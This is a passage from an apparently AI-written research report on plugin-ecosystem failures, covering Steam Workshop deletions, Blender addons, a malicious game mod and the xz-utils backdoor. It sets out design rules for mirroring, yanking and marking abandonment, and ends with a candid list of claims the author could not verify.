  software with no author involvement at all.
- **Steam Workshop author deletion** — the subscriber keeps a dangling subscription, Steam retries the
  download on every start, and the community's advice is to wait for the workshop to catch up
  ([Steam forums](https://steamcommunity.com/discussions/forum/1/558746994930627062),
  [Unknown Worlds forums](https://forums.unknownworlds.com/discussion/136313/subscribed-to-deleted-workshop-mod)).
  Valve's `DeleteItem` "does not prompt the user and cannot be undone."
- **Blender addons after 2.80** — the workaround the community converged on was for every author to
  maintain *two* builds of their addon ([theduckcow](https://theduckcow.com/2019/update-addons-both-blender-28-and-27-support/)).
  Abandoned addons do not degrade; they stop loading.
- **People Playground** — the destructive variant: a malicious mod "replacing existing mods with infected
  versions", with players losing other mods, save files and achievements
  ([Notebookcheck](https://www.notebookcheck.net/Popular-sandbox-Steam-game-sees-virus-infect-workshop-deleting-mods-and-save-files.1218216.0.html)).
- **xz-utils, as the maintainer-attention case** — the project had effectively one overworked maintainer,
  and the attacker's lever was supplying exactly the help that maintainer needed
  ([Wikipedia](https://en.wikipedia.org/wiki/XZ_Utils_backdoor)). Maintainer scarcity is not a staffing
  problem; it is the attack surface for §2.1.

**Design rule — mirror, don't link; never let a single party be the only holder of a served artifact.**

- The host keeps a **content-addressed local cache of every installed plugin's exact bytes** and can
  reinstall fully offline. A registry outage must not be able to uninstall anything.
- **Yank, never delete.** The registry retains the last published version of every plugin indefinitely;
  yanking stops new installs while leaving existing installs resolvable.
- The plugin manifest carries an **explicit compatibility range**, so a host update can *refuse* an
  incompatible plugin rather than break it — the Steam branch-version mechanism
  ([Item Versioning](https://partner.steamgames.com/doc/features/workshop/itemversioning)) is the model to
  copy.
- **Abandonment is a first-class state.** A plugin with no update across N host releases is marked
  unmaintained in the UI and reported in the host's health view, instead of silently continuing to run.

---

## 7. What I could not verify

Stated explicitly, per the brief's rules:

- **"ShibaCoin"** — I could not confirm a malicious VS Code extension by that name. The verifiable
  incident is the ReversingLabs campaign around `ahban.shiba` / `ahban.cychelloworld` and the subsequent
  name reuse by publisher `ahbanC` ([ReversingLabs](https://www.reversinglabs.com/blog/malware-vs-code-extension-names)).
  The "Solidity" half of the prompt is confirmed: Datadog's MUT-9332 report on `solaibot`, `among-eth` and
  `blankebesxstnion`.
- **Jira/Confluence marketplace apps** and **Slack's app platform** as core-absorption examples — I did not
  find a well-documented specific incident within this search, so I have not asserted one.
- **Google Reader** as an API-shutdown example — I did not verify a citable source in this session. The
  Atom sunset covers the same platform-side mechanism with a primary source.
- **Emacs MELPA package rot** and **Bower-era dead packages** — not verified here; the Blender and Atom
  cases carry the same mechanism with better documentation.
- **`npm audit`'s exact detection semantics** — I describe it as a known-CVE query against an advisory
  database, which is its documented purpose, but I did not fetch the reference page in this session.
- **mod.io's console-certification rationale** — I state that studios can point at the moderation gate as a
  compliance artifact; that is my reading of the four-layer system, not a quoted claim from mod.io.
- **npm v12 install-script default** — reported by The Hacker News; I did not find the corresponding
  primary GitHub announcement in this session, so treat the version number as reported rather than
  confirmed.
